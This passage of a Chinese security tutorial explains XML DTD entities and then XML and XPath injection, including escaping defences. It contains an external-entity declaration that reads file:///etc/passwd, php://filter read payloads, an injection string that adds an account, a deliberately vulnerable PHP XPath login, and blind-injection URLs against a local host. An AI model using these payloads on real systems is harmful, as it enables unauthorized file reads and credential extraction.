title="DTD实体"></a><strong>DTD实体</strong></h3><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体可在内部或外部进行声明。</p><p>实体引用是对实体的引用。</p></blockquote><p><strong>DTD实体的分类：</strong></p><p><em>按实体有无参分类，实体分为<strong>一般实体</strong>和*<em>参数实体</em></em>；按实体使用方式分类，实体分为<strong>内部声明实体</strong>和<strong>引用外部实体</strong>*。</p><p><em><strong>一般实体</strong></em></p><p>声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-string">&quot;实体内容&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>引用一般实体的方法：<code>&amp;实体名称;</code></p><p>ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p><p><em><strong>参数实体</strong></em></p><p>声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % 实体名称 <span class="hljs-string">&quot;实体内容&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>引用参数实体的方法：<code>%实体名称;</code></p><p>ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><p><em><strong>内部实体</strong></em></p><p>声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-string">&quot;实体的值&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>内部实体示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">writer</span> <span class="hljs-string">&quot;Dawn&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><p><em><strong>外部实体</strong></em></p><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><p>声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;URI/URL&quot;</span>&gt;</span><br>或者<br><span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;public_ID&quot;</span> <span class="hljs-string">&quot;URI&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">copyright</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><p>根据上面代码，我们可以发现，<code>http://www.w3school.com.cn/dtd/entities.dtd</code> 是一个 URL，属于公共计算机，更适合使用 <code>PUBLIC</code> 声明，但是我们还是用了<code>SYSTEM</code>，这也是可行的。</p><p>这里我们强调一下外部引用的两种方式：</p><ul><li><p><strong><code>SYSTEM</code></strong>：用于指向一个特定的 URI，通常是指向一个具体、私有的资源（如文件路径或特定 URL）。</p></li><li><p><strong><code>PUBLIC</code></strong>：用于引用一个公共标识符（public identifier），通常是为了引用标准化的或通用的外部 DTD 文件。</p></li></ul><p>外部实体可支持http、file等协议。不同程序支持的协议不同：</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>http</td><td>file</td></tr><tr><td>http</td><td>http</td><td>https</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>https</td></tr><tr><td></td><td>php</td><td>file</td><td>ftp</td></tr><tr><td></td><td>compress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>compress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table><p>PHP支持的协议会更多一些，但需要一定的扩展：</p><table><thead><tr><th>Scheme</th><th>Extension Required</th></tr></thead><tbody><tr><td>https</td><td>openssl</td></tr><tr><td>ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell</td><td>ssh2</td></tr><tr><td>ssh2.exec</td><td>ssh2</td></tr><tr><td>ssh2.tunnel</td><td>ssh2</td></tr><tr><td>ssh2.sftp</td><td>ssh2</td></tr><tr><td>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202506082148328.png" alt="img"></p><p>PHP引用外部实体<strong>常见的利用协议</strong>：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>://文件绝对路径，如：<span class="hljs-built_in">file</span>:<span class="hljs-comment">///etc/passwd</span><br><span class="hljs-keyword">http</span>://url/<span class="hljs-built_in">file</span>.txt<br>php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=xxx.php<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意：</strong></p><p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br>update 7 和 Oracle JDK 1.6 update 35<br>2.libxml 是 PHP 的 xml 支持</p></blockquote><h1 id="XML相关安全问题"><a href="#XML相关安全问题" class="headerlink" title="XML相关安全问题"></a>XML相关安全问题</h1><h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="XML注入简介"><a href="#XML注入简介" class="headerlink" title="XML注入简介"></a>XML注入简介</h3><blockquote><p>XML的设计宗旨是传输数据，而非显示数据。</p><p>XML注入是一种古老的技术，通过利用闭合标签改写XML文件实现的。</p></blockquote><p>XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p><h3 id="XML注入前提条件"><a href="#XML注入前提条件" class="headerlink" title="XML注入前提条件"></a>XML注入前提条件</h3><p>（1）用户能够控制数据的输入<br>（2）程序将用户输入拼凑到xml中</p><h3 id="注入实例"><a href="#注入实例" class="headerlink" title="注入实例"></a><strong>注入实例</strong></h3><p>举个最简单的例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">Account</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span>用户输入<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">Account</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">USER</span>&gt;</span><br></code></pre></td></tr></table></figure><p>若攻击者刚好能掌控用户输入字段，输入</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-literal">admin</span>&lt;/<span class="hljs-literal">user</span>&gt;&lt;<span class="hljs-literal">user</span> Account=<span class="hljs-string">&quot;hacker&quot;</span>&gt;hacker<br></code></pre></td></tr></table></figure><p>最终修改结果为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">Account</span>=<span class="hljs-string">&quot;admin&quot;</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">Account</span>=<span class="hljs-string">&quot;hacker&quot;</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">Account</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">USER</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样我们可以通过XML注入添加一个管理员账户</p><p><strong>XML注入两大要素：标签闭合和获取XML表结构</strong></p><h3 id="XML注入防御"><a href="#XML注入防御" class="headerlink" title="XML注入防御"></a>XML注入防御</h3><p>（1）对用户的输入进行过滤<br>（2）对用户的输入进行转义</p><table><thead><tr><th><strong>预定义字符</strong></th><th><strong>转义后的预定义字符</strong></th></tr></thead><tbody><tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td></tr><tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td></tr><tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td></tr><tr><td><code>&#39;</code></td><td><code>&amp;apos;</code></td></tr><tr><td><code>&quot;</code></td><td><code>&amp;quot;</code></td></tr></tbody></table><h2 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h2><h3 id="什么是XPath？"><a href="#什么是XPath？" class="headerlink" title="什么是XPath？"></a>什么是XPath？</h3><p>我们讲XSL时提过XPath，它是XSL的三部分之一。这里我们详细讲一下它。</p><p>XPath 是一门在 XML 文档中查找信息的语言。XPATH可用来在XML文档中对元素和属性进行遍历。XPath 在 XML 文档中通过元素和属性进行导航，类似jquery选择器的选择路径。</p><p>XPATH 包含一个标准函数库：XPATH含有超过100个内建的函数。可以处理字符串值，数值，日期和时间比较，节点和QName处理，序列处理，逻辑值等等。</p><p>XPath的强大之处在于逻辑运算，使程序变得更有逻辑性，同时也会造成注入漏洞。</p><p>通过XPath注入攻击，可以攻击XML。<strong>XPath与SQL注入的方式类似。</strong></p><p>XPath语法参考下面文章：</p><p><a href="https://www.cnblogs.com/wendyw/p/11633588.html">Xpath基本语法</a></p><p><a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></p><h3 id="Xpath注入攻击原理"><a href="#Xpath注入攻击原理" class="headerlink" title="Xpath注入攻击原理"></a>Xpath注入攻击原理</h3><p>如果一个网站某应用程序将数据保存在XML中，并且对用户查询时的输入没有做限制。此时，攻击者提交了没有经过处理的输入，插入到 XPath 查询中，就产生了Xpath注入，这时候攻击者就可能通过控制查询，进行获取数据或者删除数据之类的操作。</p><p>可以这样理解，Xpath是xml路径语言，用于配置文件的查找。类似于SQL语言，数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。</p><p>所以，XPath注入攻击主要是通过构建特殊的输入（这些输入往往是XPath语法中的一些组合），这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。但注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入常出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> <code>parameters/input</code>等。</p><h3 id="注入实例-1"><a href="#注入实例-1" class="headerlink" title="注入实例"></a>注入实例</h3><p>1、直接注入</p><p>假设有一张BookDB表，其中包括BookID、BookName、Price，用Sql Server查询图书ID时SQL语句代码如下:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> BookDB <span class="hljs-keyword">where</span> BookID=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>当我们输入<code>1 or 1=1</code>时，运行结果可以显示当前表中的所有数据。</p><p>XPath注入攻击与SQL注入原理相似，这时我们把BookDB换成XML，代码如下：</p><p>这里我们定义了6本书</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookid</span>&gt;</span>001<span class="hljs-tag">&lt;/<span class="hljs-name">bookid</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookname</span>&gt;</span>C语言从入门到精通<span class="hljs-tag">&lt;/<span class="hljs-name">bookname</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>38<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookid</span>&gt;</span>002<span class="hljs-tag">&lt;/<span class="hljs-name">bookid</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookname</span>&gt;</span>GO语言从入门到放弃<span class="hljs-tag">&lt;/<span class="hljs-name">bookname</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>28<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookid</span>&gt;</span>003<span class="hljs-tag">&lt;/<span class="hljs-name">bookid</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookname</span>&gt;</span>ASP.NET网站开发<span class="hljs-tag">&lt;/<span class="hljs-name">bookname</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>48<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookid</span>&gt;</span>004<span class="hljs-tag">&lt;/<span class="hljs-name">bookid</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookname</span>&gt;</span>WinFrom开发桌面应用程序<span class="hljs-tag">&lt;/<span class="hljs-name">bookname</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>58<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookid</span>&gt;</span>005<span class="hljs-tag">&lt;/<span class="hljs-name">bookid</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookname</span>&gt;</span>JAVA编程思想<span class="hljs-tag">&lt;/<span class="hljs-name">bookname</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>65<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookid</span>&gt;</span>006<span class="hljs-tag">&lt;/<span class="hljs-name">bookid</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bookname</span>&gt;</span>C#面向对象程序设计<span class="hljs-tag">&lt;/<span class="hljs-name">bookname</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>45<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span><br></code></pre></td></tr></table></figure><p>若需要查询编号为001的图书对应的书名，则XPath语句为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bookstore/book[bookid/text()=<span class="hljs-string">&#x27;001&#x27;</span> ]/bookname<br></code></pre></td></tr></table></figure><p>下面我们进行查询，部分代码如下</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">xml</span> <span class="hljs-operator">=</span> loadXMLDoc(<span class="hljs-string">&quot;../BookList.xml&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attribute">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/bookstore/book[bookid/text()=&#x27;001&#x27; ]/bookname&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>结果为：</p><p> <img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202506011824107.png" alt="img">               </p><p>假设我们可以控制XPath语句，那么可以使用之前提到的<code>or 1=1</code>遍历全部的bookname,代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bookstore/book[bookid/text()=<span class="hljs-string">&#x27;001&#x27;</span> or 1=1]]/bookname<br></code></pre></td></tr></table></figure><p>运行结果为：</p><p> <img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202506011818961.png" alt="img"></p><p>成功get所有的bookname。</p><p>XPath注入攻击利用两种技术，即<strong>XPath扫描</strong>和 <strong>XPath查询布尔化</strong>。</p><p>2、XPath盲注</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">xml文件代码：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span> </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> </span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span> </span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>test2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">php查询代码：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-variable">$xml</span>=<span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&#x27;test2.xml&#x27;</span>);</span><br><span class="language-php"><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$pwd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;/root/users/user[username/text()=&#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27; and password/text()=&#x27;&quot;</span>.<span class="hljs-variable">$pwd</span>.<span class="hljs-string">&quot;&#x27;]&quot;</span>;</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>;</span><br><span class="language-php"><span class="hljs-variable">$result</span>=<span class="hljs-variable">$xml</span>-&gt;<span class="hljs-title function_ invoke__">xpath</span>(<span class="hljs-variable">$query</span>);</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;</span><br><span class="language-php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;Welcome&lt;/h2&gt;&#x27;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;ID:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;id;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br /&gt;Username:&#x27;</span>.<span class="hljs-variable">$value</span>-&gt;username;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>盲注手法：</p><p>先利用count（&#x2F;*）判断根下节点，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/xml/<span class="hljs-number">2</span>.php?name=&#x27; or count(/*) = <span class="hljs-number">1</span> or &#x27;<span class="hljs-number">1</span>&#x27; = &#x27;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>有返回结果证明存在一个根节点。</p><p>利用substring分割根节点的每个字符，猜解第一级节点：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/xml/</span><span class="hljs-number">2</span>.php?name=<span class="hljs-string">&#x27; or substring(name(/*[position() = 1]),1,1)=&#x27;</span><span class="hljs-string">r&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/xml/</span><span class="hljs-number">2</span>.php?name=<span class="hljs-string">&#x27; or substring(name(/*[position() = 1]),2,1)=&#x27;</span>o<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>…</p><p>最终结果: root</p><p>然后盲注root的下一级节点，</p><p>判断root的下一级节点数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1</span>/xml/<span class="hljs-number">2</span>.php?name=&#x27; or count(/root/*) = <span class="hljs-number">1</span> or &#x27;<span class="hljs-number">1</span>&#x27; = &#x27;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>有返回结果证明存在一个root的下一级节点。</p><p>猜解root的下一级节点：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code 